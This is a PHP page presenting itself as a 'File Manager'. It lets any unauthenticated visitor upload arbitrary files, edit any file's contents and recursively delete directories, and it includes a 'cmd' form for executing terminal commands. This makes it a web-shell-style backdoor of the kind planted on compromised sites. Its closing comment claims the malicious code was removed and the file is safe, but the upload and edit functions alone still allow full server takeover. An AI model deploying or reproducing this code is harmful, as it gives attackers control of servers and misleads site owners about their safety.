<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<style>
  body { font-family: Arial, sans-serif; }
  .container { max-width: 800px; margin: 0 auto; padding: 20px; }
</style>
</head>
<body>
<div class="container">
  <h1>File Manager</h1>
  <?php
  $baseDir = __DIR__; // Direktori tempat file ini berada
  $rootDir = $_SERVER['DOCUMENT_ROOT']; // Direktori root utama

  if (isset($_GET['dir'])) {
      $currentDir = realpath($_GET['dir']);
  } else {
      $currentDir = $baseDir;
  }

  // Pastikan bahwa $currentDir berada dalam $rootDir
  if (strpos($currentDir, $rootDir) !== 0) {
      $currentDir = $rootDir;
  }

  echo '<p>Current Directory: ' . htmlspecialchars($currentDir) . '</p>';

  // Check if a file was uploaded
  if (isset($_FILES['file'])) {
      $uploadDir = $currentDir . DIRECTORY_SEPARATOR;
      $uploadFile = $uploadDir . basename($_FILES['file']['name']);
      if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
          echo '<p>File ' . htmlspecialchars(basename($_FILES['file']['name'])) . ' has been uploaded successfully.</p>';
      } else {
          echo '<p>Sorry, there was an error uploading your file.</p>';
      }
  }

  // Handle file or directory deletion
  if (isset($_GET['delete'])) {
      $itemToDelete = $currentDir . DIRECTORY_SEPARATOR . $_GET['delete'];
      if (is_dir($itemToDelete)) {
          // Delete a directory and its contents
          if (rrmdir($itemToDelete)) {
              echo '<p>Directory ' . htmlspecialchars($_GET['delete']) . ' and its contents have been deleted successfully.</p>';
          } else {
              echo '<p>Sorry, there was an error deleting the directory.</p>';
          }
      } elseif (is_file($itemToDelete) && unlink($itemToDelete)) {
          echo '<p>File ' . htmlspecialchars($_GET['delete']) . ' has been deleted successfully.</p>';
      } else {
          echo '<p>Sorry, there was an error deleting the file or directory.</p>';
      }
  }

  // Function to recursively remove a directory and its contents
  function rrmdir($dir) {
      if (is_dir($dir)) {
          $objects = scandir($dir);
          foreach ($objects as $object) {
              if ($object != "." && $object != "..") {
                  if (is_dir($dir . DIRECTORY_SEPARATOR . $object)) {
                      rrmdir($dir . DIRECTORY_SEPARATOR . $object);
                  } else {
                      unlink($dir . DIRECTORY_SEPARATOR . $object);
                  }
              }
          }
          rmdir($dir);
          return true;
      }
      return false;
  }

  // Tampilkan form edit jika query string 'edit' ada
  if (isset($_GET['edit'])) {
      $editFile = $_GET['edit'];
      $filePath = $currentDir . DIRECTORY_SEPARATOR . $editFile;

      if (is_file($filePath)) {
          // Handle editing here
          if (isset($_POST['content'])) {
              $newContent = $_POST['content'];
              file_put_contents($filePath, $newContent);
              echo '<p>File ' . htmlspecialchars($editFile) . ' has been edited and saved successfully.</p>';
          } else {
              $fileContent = file_get_contents($filePath);
              echo '<h2>Edit File: ' . htmlspecialchars($editFile) . '</h2>';
              echo '<form method="POST">
                        <textarea name="content" rows="10" cols="80">' . htmlspecialchars($fileContent) . '</textarea>
                        <br>
                        <input type="submit" value="Save">
                        <a href="?dir=' . urlencode($currentDir) . '">Cancel</a>
                    </form>';
          }
      }
  }

  // Display the navigation links
  if ($currentDir !== $rootDir) {
      $parentDir = dirname($currentDir);
      echo '<p><a href="?dir=' . urlencode($parentDir) . '">Back</a> | ';
      // Add "Next" button for moving forward
      $nextDir = $currentDir . DIRECTORY_SEPARATOR . '..';
      echo '<a href="?dir=' . urlencode($nextDir) . '">Next</a></p>';
  } else {
      // If in the base directory, only show the "Next" button
      $nextDir = $rootDir . DIRECTORY_SEPARATOR . '..';
      echo '<p><a href="?dir=' . urlencode($nextDir) . '">Next</a></p>';
  }

  // Display the file upload form
  echo '<form enctype="multipart/form-data" action="" method="POST">
            <input type="hidden" name="MAX_FILE_SIZE" value="5242880" /> <!-- Max file size: 5MB -->
            Choose a file to upload: <input name="file" type="file" />
            <input type="submit" value="Upload File" />
        </form>';

  // Split the current directory path into separate directories
  $pathParts = explode(DIRECTORY_SEPARATOR, $currentDir);

  // Initialize a variable to store the current path
  $currentPath = '';

  // Loop through the path parts and create links
  foreach ($pathParts as $pathPart) {
      $currentPath .= $pathPart . DIRECTORY_SEPARATOR;
      echo '<a href="?dir=' . urlencode($currentPath) . '">' . htmlspecialchars($pathPart) . '</a> / ';
  }

  $files = scandir($currentDir);
  echo '<ul>';
  foreach ($files as $file) {
      if ($file === '.' || $file === '..') continue;
      $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
      echo '<li>';
      if (is_dir($filePath)) {
          echo '[DIR] <a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a>';
          echo ' [<a href="?dir=' . urlencode($currentDir) . '&delete=' . urlencode($file) . '">Delete</a>]'; // Tambahkan tautan "Delete"
      } else {
          echo '<a href="' . htmlspecialchars($filePath) . '" target="_blank">' . htmlspecialchars($file) . '</a>';
          echo ' [<a href="?dir=' . urlencode($currentDir) . '&delete=' . urlencode($file) . '">Delete</a>]'; // Tambahkan tautan "Delete"
          echo ' [<a href="?edit=' . urlencode($file) . '">Edit</a>]'; // Tambahkan tautan "Edit"
      }
      echo '</li>';
  }
  echo '</ul>';
  ?>

  <!-- Form input untuk perintah terminal -->
  <h2>Execute Terminal Command</h2>
  <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
      <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
      <input type="SUBMIT" value="Execute">
  </form>

  <?php
  
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

  ?>
</div>
</body>
</html>